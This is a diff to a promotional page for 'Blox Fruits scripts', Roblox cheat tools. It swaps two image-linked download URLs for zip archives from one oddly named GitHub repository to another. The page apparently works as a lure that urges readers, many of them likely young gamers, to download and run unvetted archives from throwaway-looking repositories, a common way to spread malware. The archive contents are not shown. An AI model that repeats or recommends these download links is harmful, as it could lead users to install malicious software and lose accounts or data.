@@ -3,10 +3,10 @@
 **Blox Fruits** is one of the most exciting and action-packed games on **Roblox**, where players can explore vast islands, battle fierce enemies, and gain powerful abilities through **Devil Fruits**. However, with the amount of grinding, leveling, and farming required, some players may find it challenging to progress quickly. That’s where **Blox Fruits scripts** come in! These powerful tools automate in-game tasks and provide you with a competitive edge in your quest for dominance in the world of **Blox Fruits**.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 [![be2727eb-5ae9-45d3-93cf-3c14393e4ada](https://github.com/user-attachments/assets/6a671348-0bac-4085-8a6f-70ea3ce48872)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 
 This guide will explore everything you need to know about **Blox Fruits scripts**, how they work, the benefits of using them, the best scripts available in 2025, and more. If you’re looking to take your **Blox Fruits** experience to the next level, read on to discover how **scripts** can supercharge your gameplay.
